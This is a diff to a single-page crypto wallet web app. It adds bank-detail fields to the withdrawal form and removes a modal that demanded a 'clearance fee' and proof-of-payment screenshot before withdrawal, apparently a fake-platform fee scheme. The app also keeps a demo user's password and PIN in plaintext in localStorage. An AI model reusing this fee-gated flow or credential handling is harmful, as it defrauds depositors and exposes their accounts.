@@ -420,7 +420,7 @@
             <div class="balance-card">
                 <div style="color:var(--text-muted); font-size:0.875rem;">Total Portfolio Value</div>
                 <h1 style="font-size:2.8rem; color:#fff; margin:0.25rem 0;" id="user-total-val">$0.00</h1>
-                <p style="color:var(--accent-green); font-size:0.875rem;" id="portfolio-change">▲ Portfolio Synced</p>
+                <p style="color:var(--accent-green); font-size:0.875rem;">▲ Portfolio Synced</p>
 
                 <div class="action-row-side">
                     <button class="btn" onclick="openSendModal()">↗ Send</button>
@@ -657,8 +657,24 @@
             <span class="close-btn" onclick="closeWithdrawFormModal()">&times;</span>
             <h3 style="margin-bottom:1rem;" id="withdraw-method-title">Withdraw</h3>
             <form onsubmit="requestWithdrawalPinCheck(event)">
-                <div class="form-group"><label id="withdraw-destination-label">Account Details</label><input type="text" id="withdraw-addr" class="form-control" required></div>
-                <div class="form-group"><label>Amount (USD)</label><input type="number" id="withdraw-amt" class="form-control" required></div>
+                <div id="bank-specific-fields">
+                    <div class="form-group">
+                        <label>Bank Name</label>
+                        <input type="text" id="withdraw-bank-name" class="form-control" placeholder="e.g. Chase Bank / GTBank">
+                    </div>
+                    <div class="form-group">
+                        <label>Account Name</label>
+                        <input type="text" id="withdraw-acc-name" class="form-control" placeholder="Account holder name">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label id="withdraw-destination-label">Account Details / IBAN</label>
+                    <input type="text" id="withdraw-addr" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label>Amount (USD)</label>
+                    <input type="number" id="withdraw-amt" class="form-control" required>
+                </div>
                 <button type="submit" class="btn btn-success">Proceed to PIN Authorization</button>
             </form>
         </div>
@@ -829,30 +845,6 @@
         </div>
     </div>
 
-    <!-- ACTION / PROOF MODAL -->
-    <div class="modal" id="action-modal">
-        <div class="modal-body">
-            <span class="close-btn" onclick="closeActionModal()">&times;</span>
-            <h3 style="color:var(--accent-yellow); margin-bottom:0.5rem;">⚠️ Pending Action Required</h3>
-            <p style="color:var(--text-muted); font-size:0.875rem;" id="modal-step-title">Action Step</p>
-
-            <div class="payment-box">
-                <div style="font-size:0.8rem; color:var(--text-muted);">Required Clearance Fee</div>
-                <div style="font-size:1.5rem; font-weight:bold; color:var(--text-main);" id="modal-step-amount">$0.00</div>
-                <div style="font-size:0.8rem; color:var(--text-muted); margin-top:0.75rem;">Payment Details</div>
-                <div style="font-weight:600; color:var(--primary); margin-top:0.25rem;" id="modal-pm-name">Method</div>
-                <div style="font-size:0.85rem; font-family:monospace; word-break:break-all; color:var(--text-main); margin-top:0.25rem;" id="modal-pm-details">Details</div>
-            </div>
-
-            <div class="form-group">
-                <label>Upload Payment Screenshot Proof</label>
-                <input type="file" id="proof-file" class="form-control" accept="image/*">
-            </div>
-
-            <button class="btn btn-success" onclick="submitProof()">Upload Proof & Clear Action</button>
-        </div>
-    </div>
-
     <!-- SUPPORT CHAT -->
     <button class="chat-widget-btn" onclick="toggleChat()">💬</button>
     <div class="chat-window" id="chat-window">
@@ -870,7 +862,6 @@
     </div>
 
     <script>
-        // Multi-User Database & State
         let usersList = JSON.parse(localStorage.getItem('chronicle_users')) || [
             { email: "demo@chronicle.io", password: "password123", status: "Approved", pin: "1234", btc: 1.2485, eth: 14.20, usd: 48250.00, txs: [], stepIdx: 0, activeTxId: null }
         ];
@@ -1015,7 +1006,7 @@
             alert("Funds sent successfully!");
         }
 
-        // Withdraw logic & Payout options
+        // Withdraw logic & Payout options with Bank Name support
         function openWithdrawModal() {
             if (!currentUserEmail) { alert("Please sign in first."); openAuthModal(); return; }
             document.getElementById('withdraw-modal').style.display = 'flex';
@@ -1026,7 +1017,19 @@
             selectedWithdrawMethodName = method;
             closeWithdrawModal();
             document.getElementById('withdraw-method-title').innerText = `Withdraw via ${method}`;
-            document.getElementById('withdraw-destination-label').innerText = method === 'Bank Transfer' ? 'IBAN / Account Number' : method === 'PayPal' ? 'PayPal Email' : method === 'Zelle' ? 'Zelle Phone / Email' : '$Cashtag';
+            
+            const bankFields = document.getElementById('bank-specific-fields');
+            if (method === 'Bank Transfer') {
+                bankFields.style.display = 'block';
+                document.getElementById('withdraw-bank-name').required = true;
+                document.getElementById('withdraw-acc-name').required = true;
+                document.getElementById('withdraw-destination-label').innerText = 'Account Number / IBAN';
+            } else {
+                bankFields.style.display = 'none';
+                document.getElementById('withdraw-bank-name').required = false;
+                document.getElementById('withdraw-acc-name').required = false;
+                document.getElementById('withdraw-destination-label').innerText = method === 'PayPal' ? 'PayPal Email' : method === 'Zelle' ? 'Zelle Phone / Email' : '$Cashtag';
+            }
             document.getElementById('withdraw-form-modal').style.display = 'flex';
         }
         function closeWithdrawFormModal() { document.getElementById('withdraw-form-modal').style.display = 'none'; }
